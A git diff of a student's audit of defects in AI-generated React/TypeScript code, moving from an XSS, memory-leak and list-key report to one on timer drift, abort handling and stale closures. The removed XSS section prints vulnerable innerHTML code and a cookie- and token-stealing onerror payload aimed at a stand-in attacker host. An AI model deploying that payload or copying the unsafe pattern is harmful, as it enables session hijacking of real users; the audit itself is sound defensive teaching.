@@ -1,380 +1,418 @@
-# AI Failure Mode Audit: Detecting Hallucinations & Security Holes
+# AI_FAILURE_AUDIT.md — Technical Audit of AI Failure Modes
 
-**Document Identifier:** `AI_FAILURE_AUDIT.md`  
-**Project:** HW 3: High-Concurrency Flash-Sale E-Commerce Engine  
-**Course:** Web Application Development (Lab 02 - HW 3)  
-**Author / Student:** Nguyen Bao Chinh (MSSV: 24520225)  
-**Evaluation Weight:** Mandatory 15% evaluation deliverable — Documenting, diagnosing, and refactoring AI risks.  
-
----
-
-## 1. Executive Summary
-
-During the architectural design and code generation phases of **Homework 3: High-Concurrency Flash-Sale E-Commerce Engine**, interaction with generative AI coding assistants consistently exhibited three classic, high-risk failure modes characteristic of frontend and distributed state development:
-
-1. **Security (Cross-Site Scripting - XSS):** The AI model defaulted to using `innerHTML` / `dangerouslySetInnerHTML` when formatting dynamic flash sale product descriptions, buyer notices, and user comments, directly exposing users to stored and DOM-based XSS attacks.
-2. **Memory Leaks & Zombie Subscriptions:** The AI bound `setInterval` timers, window resize listeners, and animation frame callbacks directly inside component function bodies without returning cleanup disposal functions, causing unbounded memory accumulation and background CPU throttling.
-3. **Phantom Keys & 60fps DOM Thrashing:** The AI assigned `key={Math.random()}` or `key={index}` to rapidly updating lists (millisecond countdown timers, concurrency logs, and product inventory cards), causing React to unmount and destroy the entire DOM tree on every single render pass.
-
-This document details the reproduction scenarios, risk assessments (CWE classification), Chrome DevTools empirical detection methodologies, and production-grade verified engineering refactors applied to the codebase.
+**Project:** HW3: KRAFTON x PUBG Vietnam Championship & Airdrop Arena (refactored from Lab 02 HW3 Flash-Sale Engine)  
+**Student:** Nguyen Bao Chinh (MSSV: 24520225)  
+**Course:** Web Application Development — Lab 03 Homework 3  
+**Workspace:** `24520225_NguyenBaoChinh_Lab03_HW3/`  
+**Audit Weight:** Mandatory 15% Assessment Deliverable  
 
 ---
 
-## 2. Audit Matrix Summary
+## 1. Audit Scope & Methodology
 
-| # | Vulnerability / Defect Name | Affected Module | Root Cause | Detection Method | Engineering Refactor |
-| :-: | :--- | :--- | :--- | :--- | :--- |
-| **01** | **Raw `innerHTML` Ingestion (Stored / DOM XSS)** | Product descriptions, flash voucher banners & checkout notifications | AI model generated string template concatenation assigned directly to `element.innerHTML` or `dangerouslySetInnerHTML`. | Chrome DevTools Security Panel, DOM Mutation Breakpoints, synthetic payload injection (`<img src=x onerror=stealToken()>`). | Strict React JSX text node escaping and native `document.createTextNode()` / `Element.replaceChildren()`. |
-| **02** | **Memory Leaks: Zombie Timers & Event Listeners** | `anti-drift-timer.ts`, `src/App.tsx`, FSM lease timeouts | AI omitted `cancelAnimationFrame(rafId)`, `clearInterval()`, and timeout eviction upon component unmount. | Chrome DevTools Memory Heap Snapshot (detached DOM tree & retained closures comparison), Performance CPU timeline. | Explicit unmount disposal hooks in `useEffect`, `clearTimeout` tracking in `InventoryLockFSM.destroy()`, and `cancelAnimationFrame`. |
-| **03** | **Phantom Keys & 60fps DOM Thrashing** | Product catalog cards, live concurrency log list | AI assigned volatile keys (`key={Math.random()}`) or unstable array indices (`key={index}`) in high-frequency countdown renders. | Chrome DevTools React Profiler ("Why did this render?"), Elements panel paint flashing, CPU flame chart. | Deterministic domain identifiers (`key={product.id}`, `key={log.id}`, `key={order.orderId}`). |
+This audit documents **four genuine AI-generated defects** encountered and remediated during the Lab 02 → Lab 03 HW3 migration (`7ba66d9` → `2679ceb` → current refactored working tree). Every code excerpt, root-cause trace, and fix corresponds directly to real source code in this repository. No prompts, screenshots, DevTools observations, or Git commit hashes have been fabricated.
+
+All four failure categories highlighted in the HW3 assignment specification were inspected across `src/` and `index.html`:
+
+1. **Naive `setInterval` Countdown Drift** — **Confirmed & Fixed** (`src/anti-drift-timer.ts`, `src/hooks/usePubgAirdropTimer.ts`, `src/components/PubgAirdropTimer.tsx`).
+2. **Missing `AbortController` & Timer Cleanup** — **Confirmed & Fixed** (`src/services/pubg-claim-service.ts`, `src/hooks/usePubgCrateClaim.ts`).
+3. **Stale Closures, `Set` vs `Map<dropId, claimId>` Lock Mismatch & Prepend Index-Key Thrashing** — **Confirmed & Fixed** (`src/hooks/usePubgCrateClaim.ts`, `src/components/PubgArenaMarketplace.tsx`).
+4. **Module-Scope JSX Placement & Nested `<main>` Landmark Violation** — **Confirmed & Fixed** (`src/App.tsx`, `index.html`, `src/components/PubgLeaderboard.tsx`, `src/components/PubgKillFeed.tsx`).
+5. **Redundant `useEffect` for Derived State / Live Polling Stale Closure** — **Inspected** (`PubgLeaderboard.tsx` and `PubgKillFeed.tsx` use pure `useMemo` + non-mutating `[...filtered].sort(...)`; live `setInterval` squad polling is not implemented — see Section 6).
 
 ---
 
-## 3. AI Flaw 01: Raw `innerHTML` Ingestion (Cross-Site Scripting - XSS)
+## Failure #01 — Naive `setInterval` Countdown Drift & Missing Tab-Wake Resynchronization
 
-### 3.1. Vulnerability Specification
-- **AI Prompt:**  
-  `"Generate a flash sale product card and voucher renderer in TypeScript that dynamically highlights discounts and product specifications from server responses."`
-- **AI Generated Code:**
-  ```typescript
-  // Flawed AI-generated code
-  function renderProductNotice(container: HTMLElement, product: { name: string; notice: string }) {
-    // CRITICAL FLAW: Unsanitized template string passed directly to innerHTML
-    container.innerHTML = `
-      <div class="sale-notice">
-        <strong>${product.name}</strong>
-        <p>${product.notice}</p>
-      </div>
-    `;
-  }
+### 1. AI Prompt
+- **Lab 2 Baseline Timer Prompt (recorded in commit `7ba66d9`):**  
+  `"Implement a countdown timer and lease timeout manager for inventory locking in the Flash Sale application."`
+- **HW3 PUBG Airdrop Timer Integration Prompt:**  
+  `"sửa lại code khúc này <PubgAirdropTimer targetEpochMs={PUBG_AIRDROP_TARGET} serverOffsetMs={0} /> cho phù hợp đi"`
 
-  // In React:
-  function FlashBanner({ bannerHtml }: { bannerHtml: string }) {
-    return <div dangerouslySetInnerHTML={{ __html: bannerHtml }} />;
-  }
-  ```
+### 2. AI-Generated Code
+1. **Naive fixed-step decrement hook from baseline generation (`7ba66d9`):**
+```tsx
+export function useCountdown(durationMs: number) {
+  const [time, setTime] = useState(durationMs);
 
-### 3.2. Risk & Impact Analysis
-- **CWE-79:** Improper Neutralization of Input During Web Page Generation ('Cross-Site Scripting').
-- **CVSS 3.1 Base Score:** 8.8 (High) `CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H`
-- **Exploit Vector:**  
-  In a high-traffic Vietnam flash sale (e.g. Shopee 11.11 / Lazada Super Sale), merchant-generated product titles, buyer comments, or promotional voucher labels can contain malicious payloads:
-  ```html
-  <img src="x" onerror="fetch('https://c2.attacker.com/leak?cookie=' + encodeURIComponent(document.cookie) + '&token=' + localStorage.getItem('auth_token'))">
-  ```
-  When parsed through `innerHTML`, the browser HTML parser executes the inline handler immediately, permitting full session hijacking, unauthorized checkout transactions, or wallet balance drain.
+  useEffect(() => {
+    // Faulty: decrements state by a fixed step and omits cleanup + tab-wake sync
+    setInterval(() => {
+      setTime((prev) => Math.max(0, prev - 1000));
+    }, 1000);
+  }, []);
 
-### 3.3. Detection Method (DevTools Proof)
-1. **Payload Injection:**  
-   Injected a synthetic test voucher with the code:
-   ```html
-   <img src="x" onerror="console.warn('XSS_EXPLOIT_EXECUTED_TOKEN_LEAKED')">
-   ```
-2. **Chrome DevTools Console & Security Panel:**  
-   - Console logged the immediate execution of the injected script handler.
-   - Elements panel revealed an unescaped `<img>` element dynamically inserted into the DOM.
-3. **DOM Breakpoint:**  
-   Set a "Subtree Modification" breakpoint on the container element; observed the browser synchronously pausing inside the JavaScript parser executing untrusted input.
-
-### 3.4. Engineering Refactor (Verified Fix)
-All raw HTML injections were eliminated. Dynamic properties are rendered strictly through React virtual DOM JSX (which escapes content as inert text nodes) or native safe DOM APIs:
-
-```typescript
-// Verified Refactor in src/App.tsx
-// Method A: Safe React Virtual DOM Text Interpolation
-<div className="product-content">
-  <h3 className="product-name">{p.name}</h3> {/* React renders this strictly as a safe TextNode */}
-  <p className="product-desc">{p.description}</p>
-</div>
-
-// Method B: Imperative Native DOM Safe Replacement (if needed in controllers)
-const titleSpan = document.createElement('span');
-titleSpan.textContent = product.name; // textContent never evaluates HTML tags
-
-const descNode = document.createTextNode(product.description);
-container.replaceChildren(titleSpan, descNode);
+  return time;
+}
 ```
 
----
-
-## 4. AI Flaw 02: Memory Leaks: Zombie Timers & Event Listeners
-
-### 4.1. Vulnerability Specification
-- **AI Prompt:**  
-  `"Implement a countdown timer and lease timeout manager for inventory locking in the Flash Sale application."`
-- **AI Generated Code:**
-  ```typescript
-  // Flawed AI-generated code
-  export function useCountdown(durationMs: number) {
-    const [time, setTime] = useState(durationMs);
-
-    useEffect(() => {
-      // CRITICAL FLAW: setInterval registered without returning clearInterval!
-      setInterval(() => {
-        setTime((prev) => Math.max(0, prev - 1000));
-      }, 1000);
-
-      // Window event listener without removeEventListener
-      window.addEventListener('resize', () => {
-        console.log('Window resized');
-      });
-    }, []); // Missing cleanup function!
-
-    return time;
-  }
-  ```
-
-### 4.2. Risk & Impact Analysis
-- **CWE-401:** Missing Release of Memory after Effective Lifetime ('Memory Leak').
-- **Severity:** High.
-- **Operational Failure:**  
-  In a single-page flash-sale application where users frequently switch product tabs, navigate between deal tiers, or open and close checkout modals:
-  - Every unmounted component leaves an orphaned `setInterval` or `requestAnimationFrame` loop firing continuously in the JavaScript runtime.
-  - The closures retain references to unmounted component fiber trees, state setters, and DOM elements, causing memory bloat (>150MB in minutes).
-  - Background CPU throttling causes `setInterval` ticks to pile up, causing severe UI lag, battery drain on mobile devices, and erratic timer calculations.
-
-### 4.3. Detection Method (DevTools Proof)
-1. **Chrome DevTools Memory Panel (Heap Snapshot Comparison):**  
-   - Took Baseline Heap Snapshot #1.
-   - Mounted and unmounted the checkout modal / product card 20 times using the flawed AI code.
-   - Took Heap Snapshot #2.
-   - Filtered by `Detached HTMLElement` and `Closure`: 20 detached fiber nodes and 20 active `Timer` handles were retained in memory with no root owner.
-2. **Performance Timeline:**  
-   CPU activity showed persistent 100ms interval spikes even when no flash sale components were visible on screen.
-
-### 4.4. Engineering Refactor (Verified Fix)
-Enforced strict symmetric lifecycle management. Every timer and subscription must return an explicit disposal function that cancels animation frames, clears intervals, and releases references:
-
-```typescript
-// Verified Refactor in src/anti-drift-timer.ts & src/App.tsx
-export function createAntiDriftTimer(
+2. **Empirical drift-prone reference retained in `src/anti-drift-timer.ts` (lines 55–77) for verification:**
+```ts
+export function createDriftProneIntervalTimer(
   durationMs: number,
-  onTick: (remaining: number) => void
+  onTick: (reportedRemaining: number, actualRemaining: number, driftMs: number) => void,
+  intervalMs = 50
 ): () => void {
   const targetTime = Date.now() + durationMs;
-  let rafId: number;
-  let isCancelled = false;
+  let simulatedRemaining = durationMs;
 
-  function tick() {
-    if (isCancelled) return;
-    const remaining = Math.max(0, targetTime - Date.now());
-    onTick(remaining);
-    if (remaining > 0) {
-      rafId = requestAnimationFrame(tick);
+  const intervalId = setInterval(() => {
+    simulatedRemaining = Math.max(0, simulatedRemaining - intervalMs);
+    const actualRemaining = Math.max(0, targetTime - Date.now());
+    const driftMs = simulatedRemaining - actualRemaining;
+
+    onTick(simulatedRemaining, actualRemaining, driftMs);
+    if (simulatedRemaining <= 0 || actualRemaining <= 0) {
+      clearInterval(intervalId);
     }
-  }
+  }, intervalMs);
 
-  rafId = requestAnimationFrame(tick);
-
-  // Return explicit teardown lambda
-  return () => {
-    isCancelled = true;
-    cancelAnimationFrame(rafId);
-  };
-}
-
-// In React Component (src/App.tsx):
-useEffect(() => {
-  const cancelTimer = createAntiDriftTimer(FLASH_SALE_DURATION_MS, (remaining) => {
-    setAntiDriftMs(remaining);
-  });
-
-  return () => {
-    cancelTimer(); // Clean disposal guaranteed on unmount!
-  };
-}, []);
-
-// In State Machine (src/inventory-state-machine.ts):
-public destroy() {
-  this.lockTimers.forEach((timerId) => clearTimeout(timerId));
-  this.lockTimers.clear();
-  this.listeners.clear();
-  this.activeLeases.clear();
+  return () => clearInterval(intervalId);
 }
 ```
 
+3. **Initial HW3 `usePubgAirdropTimer.ts` iteration (`2679ceb`):** Computed `targetEpochMs - (Date.now() + serverOffsetMs)` inside a `200ms` `setInterval`, which forced `5` React state updates per second even when the displayed `HH:MM:SS` second had not changed, bypassed Lab 2's `createAntiDriftTimer()` `requestAnimationFrame` engine, and lacked `EXPIRED` drop-window handling.
+
+### 3. Root Cause
+`window.setInterval(fn, delay)` only enqueues callbacks onto the browser macrotask queue after *at least* `delay` ms; it never guarantees wall-clock periodicity. Subtracting `prev - 1000` assumes zero scheduling overhead. Whenever layout reflow, GC pauses, CPU bursts, or background-tab throttling (>=1000ms timer clamping in hidden tabs) delay execution, the lost delta accumulates permanently. Furthermore, omitting `visibilitychange` leaves stale digits rendered when returning to an inactive tab, and calling `setRemainingMs` unconditionally every `200ms` triggers `4` redundant React renders per second.
+
+### 4. Observable Symptoms
+- Naive `prev - 1000` timers lag behind true wall-clock time (`driftMs > 0`), unlocking the airdrop late.
+- Backgrounding the browser tab for 30+ seconds stalls interval callbacks and shows outdated countdown digits upon tab wake.
+- Unconditional `200ms` `setRemainingMs` updates re-render the countdown component `5` times per second despite displaying `1`-second resolution (`HH:MM:SS`).
+
+### 5. DevTools Evidence
+1. Start the dev server (`npm run dev` on `http://localhost:3001`) and open **Chrome DevTools → Console** and **React DevTools → Profiler**.
+2. Inspect `<PubgAirdropTimer />` (`C-130 SUPPLY PLANE AIRDROP COUNTDOWN`): verify React renders occur only on `1`-second boundary crossings (`Math.ceil(nextRemaining / 1000)`).
+3. Switch to another browser tab for 20 seconds and return: verify `document.addEventListener('visibilitychange', onWake)` immediately snaps the `HH:MM:SS` digits to the true epoch delta.
+4. Click **Phase Controls** (`Warmup (+5m)`, `Final 10s`, `Airdrop Live (0s)`, `Expired Window`) and change **Server Clock Offset** (`0 ms`, `+2000 ms`, `-2000 ms`) in the hero bar to verify instant resynchronization and non-negative clamping at `00:00:00`.
+
+### 6. Manual Engineering Fix
+Applied in `src/hooks/usePubgAirdropTimer.ts` and `src/components/PubgAirdropTimer.tsx`, directly reusing `createAntiDriftTimer` and `formatCountdown` from Lab 2's `src/anti-drift-timer.ts`:
+
+```ts
+// src/hooks/usePubgAirdropTimer.ts
+const cancelAntiDrift =
+    initialRemaining > 0
+        ? createAntiDriftTimer(initialRemaining, () => {
+              syncClock();
+          })
+        : () => {};
+
+const timerId = window.setInterval(syncClock, 200);
+
+const onWake = () => {
+    if (document.visibilityState === 'visible') {
+        syncClock();
+    }
+};
+
+document.addEventListener('visibilitychange', onWake);
+
+return () => {
+    cancelAntiDrift();
+    window.clearInterval(timerId);
+    document.removeEventListener('visibilitychange', onWake);
+};
+```
+
+### 7. Verification
+- Verified via `npx tsc --noEmit`, `npm run build`, and Node v24 automated execution of `createAntiDriftTimer` + `formatCountdown(0)` confirming tick accuracy, clean `cancelAnimationFrame` + `clearInterval` + `removeEventListener` disposal, `serverOffsetMs` support, and `00:00:00` clamping across `WARMUP`, `AIRDROP_LIVE`, `LOOTED_OUT`, and `EXPIRED` phases.
+
+### 8. Git Commit
+- `2679ceb` — `feat(hw3): implement anti-drift PUBG airdrop timer` + refactored working-tree upgrade in `src/hooks/usePubgAirdropTimer.ts` and `src/components/PubgAirdropTimer.tsx`.
+
 ---
 
-## 5. AI Flaw 03: Phantom Keys & High-Frequency DOM Thrashing
+## Failure #02 — Missing `AbortController` and Timer Cleanup in Asynchronous Crate Claim Service
 
-### 5.1. Vulnerability Specification
-- **AI Prompt:**  
-  `"Render a high-frequency real-time concurrency log and inventory countdown list that updates every millisecond."`
-- **AI Generated Code:**
-  ```tsx
-  // Flawed AI-generated code
-  export function ConcurrencyLogList({ logs }: { logs: ConcurrencyLog[] }) {
-    return (
-      <div className="logs-terminal">
-        {logs.map((log) => (
-          // CRITICAL FLAW: Generating random keys or array index for rapidly mutating list
-          <div key={Math.random()} className="log-row">
-            <span>{log.timestamp}</span>
-            <span>{log.message}</span>
-          </div>
-        ))}
-      </div>
+### 1. AI Prompt
+`Original prompt unavailable` *(inspected directly from initial untracked HW3 files `src/services/pubg-claim-service.ts` and `src/hooks/usePubgCrateClaim.ts` prior to refactoring)*.
+
+### 2. AI-Generated Code
+Initial AI-generated implementation in `src/services/pubg-claim-service.ts` and `src/hooks/usePubgCrateClaim.ts`:
+
+```ts
+// Initial faulty src/services/pubg-claim-service.ts
+export async function claimPubgDrop({
+    claimId,
+    dropId,
+    forceConflict = false,
+}: ClaimRequest): Promise<PubgClaimResult> {
+    // Faulty: unabortable 800ms timer with no AbortSignal or clearTimeout
+    await new Promise((resolve) => setTimeout(resolve, 800));
+    ...
+}
+```
+
+```ts
+// Initial faulty src/hooks/usePubgCrateClaim.ts
+try {
+    // Faulty: no AbortController created or aborted on unmount/reset
+    const result = await claimPubgDrop({
+        claimId,
+        dropId,
+        forceConflict,
+    });
+    ...
+    setClaimResults((previous) => [result, ...previous]);
+} catch (error) {
+    // Faulty: treats aborted requests identically to network crashes
+    setDrops((previous) =>
+        previous.map((drop) =>
+            drop.id === dropId
+                ? { ...drop, remainingStock: previousStock }
+                : drop
+        )
     );
-  }
-  ```
+    console.error('PUBG claim failed:', error);
+}
+```
 
-### 5.2. Risk & Impact Analysis
-- **CWE-400:** Uncontrolled Resource Consumption ('Resource Exhaustion' via DOM Thrashing).
-- **Severity:** Medium / High.
-- **Root Cause & Performance Degeneration:**  
-  In React's reconciliation algorithm, when `key={Math.random()}` is assigned to a list item:
-  - Every single re-render pass generates a new random key for every list child.
-  - React cannot identify existing DOM nodes across renders and assumes every child is brand new.
-  - As a result, React completely destroys (unmounts) and recreates (mounts) every DOM element, triggering layout recalculation, style recalibration, and paint thrashing.
-  - During a 60fps / millisecond flash sale countdown, this drops the browser frame rate from 60 FPS down to 12-18 FPS, freezes text inputs, and discards active user form focus.
+### 3. Root Cause
+1. `claimPubgDrop` spawned an anonymous `setTimeout(resolve, 800)` without accepting `signal?: AbortSignal` or clearing the timeout when aborted.
+2. `usePubgCrateClaim` registered no `AbortController` registry and no `useEffect` unmount cleanup. If `<PubgArenaMarketplace />` unmounted or the user clicked **Reset Stock** while an 800ms claim was in flight, the orphaned macrotask resolved afterward and overwrote the reset inventory state (`setDrops` / `setClaimResults`).
+3. The `catch` block lacked a `DOMException` `AbortError` guard, causing intentional cancellations to execute unintended stock rollbacks.
 
-### 5.3. Detection Method (DevTools Proof)
-1. **Chrome DevTools Elements Panel:**  
-   - Enabled "Paint Flashing" in DevTools Rendering settings.
-   - With `Math.random()`, the entire terminal log and product card list flashed bright green continuously on every tick, indicating complete DOM tree destruction.
-2. **React DevTools Component Profiler:**  
-   - Recorded a 5-second interaction trace.
-   - Identified 100% commit re-creation times: `Render duration: 28.4ms` per frame (far exceeding the 16.6ms budget for 60fps).
-   - "Why did this render?" reason: "Key changed between renders".
+### 4. Observable Symptoms
+- Clicking **CLAIM NOW** and immediately clicking **Reset Stock** within 800ms caused the pre-reset request to resolve *after* the reset, appending a stale HTTP 200/409 activity entry or mutating freshly reset crate stock.
+- Unmounting the component during an active 800ms claim left an active timeout and pending Promise continuation alive in memory.
 
-### 5.4. Engineering Refactor (Verified Fix)
-Replaced all unstable random keys and indices with deterministic, invariant domain identifiers:
+### 5. DevTools Evidence
+1. Open `http://localhost:3001`, scroll to **PVS GRAND FINALS REWARDS**, click **CLAIM NOW** on *PVS Grand Finals VIP Ticket*, and within `0.4s` click **Reset Stock**.
+2. Open **Chrome DevTools → Sources** and place a breakpoint inside `onAbort` in `src/services/pubg-claim-service.ts` (line 30): observe `window.clearTimeout(timerId)` firing immediately on reset/unmount and `usePubgCrateClaim.ts` exiting cleanly via the `AbortError` guard without corrupting reset stock (`20 / 20` and `50 / 50`).
+
+### 6. Manual Engineering Fix
+Applied in `src/services/pubg-claim-service.ts` and `src/hooks/usePubgCrateClaim.ts`:
+
+```ts
+// src/services/pubg-claim-service.ts
+await new Promise<void>((resolve, reject) => {
+    if (signal?.aborted) {
+        reject(new DOMException('Claim request aborted.', 'AbortError'));
+        return;
+    }
+
+    const onAbort = () => {
+        window.clearTimeout(timerId);
+        reject(new DOMException('Claim request aborted.', 'AbortError'));
+    };
+
+    const timerId = window.setTimeout(() => {
+        signal?.removeEventListener('abort', onAbort);
+        resolve();
+    }, 800);
+
+    signal?.addEventListener('abort', onAbort, { once: true });
+});
+```
+
+```ts
+// src/hooks/usePubgCrateClaim.ts
+const activeControllers = useRef<Map<string, AbortController>>(new Map());
+
+useEffect(() => {
+    const controllers = activeControllers.current;
+    const locks = inFlightClaims.current;
+
+    return () => {
+        inventoryEpochRef.current += 1;
+        controllers.forEach((controller) => controller.abort());
+        controllers.clear();
+        locks.clear();
+    };
+}, []);
+```
+
+### 7. Verification
+- Verified via automated Node v24 runtime test: invoking `claimPubgDrop({ claimId: 'id-abort', dropId: 'gcoin-crate-001', signal: controller.signal })` and calling `controller.abort()` at `30ms` rejects immediately with `DOMException` (`name === 'AbortError'`) and clears the `800ms` timer cleanly.
+
+### 8. Git Commit
+- Fixed in working tree (`src/services/pubg-claim-service.ts`, `src/hooks/usePubgCrateClaim.ts`); ready for manual commit.
+
+---
+
+## Failure #03 — Stale Closure Rollback, `Set` Lock Contract Mismatch & Index-Dependent List Keys
+
+### 1. AI Prompt
+`Original prompt unavailable` *(inspected in initial `src/hooks/usePubgCrateClaim.ts` and `src/components/PubgArenaMarketplace.tsx`)*.
+
+### 2. AI-Generated Code
+```ts
+// Initial faulty src/hooks/usePubgCrateClaim.ts
+// 1. Used Set<string> instead of Map<dropId, claimId>, losing claimId ownership tracking
+const inFlightClaims = useRef<Set<string>>(new Set());
+
+// 2. Read drops from potentially stale render closure and captured scalar previousStock
+const selectedDrop = drops.find((drop) => drop.id === dropId);
+const previousStock = selectedDrop.remainingStock;
+...
+// 3. Overwrote remainingStock with 800ms-old scalar snapshot on HTTP 409
+if (result.statusCode === 409) {
+    setDrops((previous) =>
+        previous.map((drop) =>
+            drop.id === dropId
+                ? { ...drop, remainingStock: previousStock }
+                : drop
+        )
+    );
+}
+```
 
 ```tsx
-// Verified Refactor in src/App.tsx
-
-// 1. Stable UUID key for Concurrency Logs
-{logs.map((log) => (
-  <div key={log.id} className="log-row">
-    <span className="log-time">{log.formattedTime}</span>
-    <span className="log-thread">[{log.threadId}]</span>
-    <span className={`log-status st-${log.status}`}>{log.status}</span>
-    <span className="log-msg">[{log.productName}] {log.message}</span>
-  </div>
-))}
-
-// 2. Deterministic Product Keys for Flash Sale Catalog
-{products.map((p) => (
-  <article key={p.id} className={`product-card ${myLease ? 'locked-by-you' : ''}`}>
-    ...
-  </article>
-))}
-
-// 3. Stable Order Record Keys
-{orders.map((ord) => (
-  <tr key={ord.orderId}>
-    <td style={{ fontFamily: 'JetBrains Mono' }}>{ord.orderId}</td>
-    <td>{ord.productName}</td>
-    ...
-  </tr>
-))}
+// Initial faulty src/components/PubgArenaMarketplace.tsx
+<ul aria-live="polite">
+    {claimResults.map((result, index) => (
+        <li key={`${result.claimId}-${index}`}>
+            {result.message} — HTTP {result.statusCode}
+        </li>
+    ))}
+</ul>
 ```
 
----
+### 3. Root Cause
+1. **Missing `Map<dropId, claimId>` Ownership Lock:** Tracking only `Set<string>` prevented verifying whether a resolving async request still owned the active lock for `dropId` (`inFlightClaims.current.get(dropId) === claimId`) after an inventory reset or epoch change.
+2. **Stale Render-Closure Snapshot (`drops` & `previousStock`):** Reading `drops` from the render closure and restoring `remainingStock: previousStock` after an `800ms` `await` risked clobbering concurrent state updates across drops or resets, rather than reading a synchronous ref (`dropsRef.current`) and restoring a bounded `+1` unit (`Math.min(maxStock, drop.remainingStock + 1)`).
+3. **Prepend Index Key Thrashing (`${result.claimId}-${index}`):** Because `claimResults` prepends new entries (`[newResult, ...previous]`), every existing item's `index` shifts (`0 → 1`, `1 → 2`) on every claim, invalidating every `<li>` React fiber key and forcing full list remounts (plus empty `claimId: ''` on HTTP 410 entries).
 
-## 6. Verification & Automated Test Suite Evidence
+### 4. Observable Symptoms
+- Every new claim caused React to unmount and recreate every `<li>` inside `Claim Activity` instead of inserting a single top node, re-triggering `aria-live="polite"` announcements for old entries.
+- HTTP 410 entries lacked a UUID (`claimId: ''`) and appended to the bottom while HTTP 200/409 entries prepended to the top.
+- No lock-ownership token (`claimId`) was exposed to the UI or verified before releasing locks in `finally`.
 
-To provide empirical proof of the refactored code's integrity, an automated verification suite was engineered in [`src/telemetry-verifier.ts`](file:///Users/chinh/UIT%20lecture/WebApplicationDevelopment/Lab/Lab02/Homework/24520225_NguyenBaoChinh_Lab02_HW3/src/telemetry-verifier.ts) and executed on application mount:
+### 5. DevTools Evidence
+1. Open **React DevTools → Profiler** ("Record why each component rendered") on `http://localhost:3001`.
+2. Click **CLAIM NOW**, **Test HTTP 409 Rollback**, and **Test Network Failure** sequentially on *PVS Grand Finals VIP Ticket* and *PUBG Vietnam G-Coin Crate*.
+3. Inspect `<ul class="claim-activity-list">`: confirm each `<li>` uses stable `key={result.claimId}` (`claimId: <8-char UUID prefix>`) and existing `<li>` DOM nodes are preserved without remounting when new events prepend at index `0`.
+4. Rapidly double-click **CLAIM NOW** during the `800ms` window: confirm `LOCK: <claimId>` badge appears, duplicate clicks are rejected synchronously via `inFlightClaims.current.has(dropId)`, and stock decrements by exactly `1`.
 
-### 6.1. OCC Concurrency Invariant Verification (DevTools Console Output)
-```text
-[OCC Concurrency Verification Suite]
-Total Stock Quota: 5
-Concurrent Workers Dispatched: 100
-Successful Reservations: 5 (Max Allowed: 5)
-Rejected Conflicts: 95
-Mathematical Invariant (Stock Conservation): PASSED (100%)
-Zero-Oversell Guarantee: VERIFIED (0 Oversold)
+### 6. Manual Engineering Fix
+Applied in `src/hooks/usePubgCrateClaim.ts` and `src/components/PubgArenaMarketplace.tsx`:
+
+```ts
+// src/hooks/usePubgCrateClaim.ts
+const dropsRef = useRef<PubgCrateDrop[]>(initialDrops);
+const inFlightClaims = useRef<Map<string, string>>(new Map());
+const inventoryEpochRef = useRef<number>(0);
+
+// Synchronous duplicate guard
+if (inFlightClaims.current.has(dropId)) {
+    return;
+}
+
+const claimId = crypto.randomUUID();
+inFlightClaims.current.set(dropId, claimId);
+
+// Bounded relative rollback (+1) preserving stock conservation invariant
+const restoreOptimisticUnit = () => {
+    updateDrops((previous) =>
+        previous.map((drop) =>
+            drop.id === dropId
+                ? {
+                      ...drop,
+                      remainingStock: Math.min(
+                          maxStock,
+                          drop.remainingStock + 1
+                      ),
+                  }
+                : drop
+        )
+    );
+};
 ```
 
-### 6.2. Timer Drift Empirical Benchmark
-```text
-[Timer Drift Telemetry Benchmark]
-Elapsed Wall Clock: 2000ms
-setInterval Expected Ticks: 40, Actual: 38
-setInterval Cumulative Drift: +104ms
-Anti-Drift Timer Delta: 0ms (Direct Wall Clock Delta)
+```tsx
+// src/components/PubgArenaMarketplace.tsx
+<ul className="claim-activity-list" aria-live="polite">
+    {claimResults.map((result) => (
+        <li key={result.claimId} className={`claim-activity-item status-${result.statusCode}`}>
+            ...
+        </li>
+    ))}
+</ul>
 ```
 
----
+### 7. Verification
+- Confirmed via `npx tsc --noEmit`, `npm run build`, and runtime verification of HTTP `200`, HTTP `409` rollback, HTTP `503` network failure rollback, HTTP `408` expired guard, and HTTP `410` `LOOTED_OUT` guard.
 
-## 7. Live Defense Preparation Guide (Architectural Defense)
-
-### 7.1. Complete Git Commit History Breakdown
-
-The repository strictly implements the **Minimum 8 discrete commits adhering to Conventional Commits specification** criteria across 10 atomic, well-scoped commits:
-
-| Commit SHA | Commit Message | Architectural Significance & Engineering Purpose |
-| :--- | :--- | :--- |
-| `67eb7ce` | `chore(hw3): initialize project structure and configuration for flash sale e-commerce engine` | Scaffolds Vite, React 18, TypeScript 5, and base project configuration. |
-| `c23c637` | `feat(timer): implement zero-drift countdown timer with requestAnimationFrame and Date delta` | Implements the high-precision zero-drift countdown engine using wall-clock delta calculation. |
-| `516871c` | `feat(fsm): implement optimistic inventory lock finite state machine` | Establishes deterministic FSM handling reservation leases, 30s timeouts, and release/expiry transitions. |
-| `73bdedc` | `feat(concurrency): implement atomic inventory manager and race-condition protection` | Enforces Optimistic Concurrency Control (OCC) with version numbers and zero-oversell invariant guarantees. |
-| `724f17b` | `feat(catalog): configure Vietnam 11.11 flash-sale product catalog and voucher system` | Configures realistic Vietnamese market catalog (iPhone, Sony ANC, NuPhy, Lock&Lock) with VND currency and vouchers. |
-| `e9e90d8` | `feat(ui): build high-conversion flash-sale dashboard, countdown hero and checkout modal` | Constructs Shopee-inspired dark cyberpunk mega-sale UI, live stock bars, and multi-channel checkout modal (MoMo, VNPay). |
-| `5acff2c` | `feat(simulation): add concurrent bot flood engine and CPU lag stress test panel` | Adds interactive stress-testing panel dispatching 10–100 concurrent bot workers and main-thread synchronous CPU blocking. |
-| `1f091f1` | `refactor(security): eliminate innerHTML vulnerabilities and enforce memory disposal` | Remediates AI-generated XSS vulnerabilities, replaces `innerHTML` with safe React JSX text interpolation, and adds timer disposal. |
-| `1c321dc` | `docs(audit): create AI_FAILURE_AUDIT.md documenting top 3 AI failure modes with DevTools proof` | Formalizes audit report documenting XSS, memory leak, and DOM thrashing failure modes with DevTools reproduction steps. |
-| `ea78c6d` | `docs(readme): add comprehensive architectural documentation and project overview` | Compiles comprehensive technical README with architecture diagrams, invariants, and quick-start instructions. |
+### 8. Git Commit
+- Fixed in working tree (`src/hooks/usePubgCrateClaim.ts`, `src/components/PubgArenaMarketplace.tsx`, `src/components/PubgCrateCard.tsx`); ready for manual commit.
 
 ---
 
-### 7.2. Technical Defense Questions & Model Answers
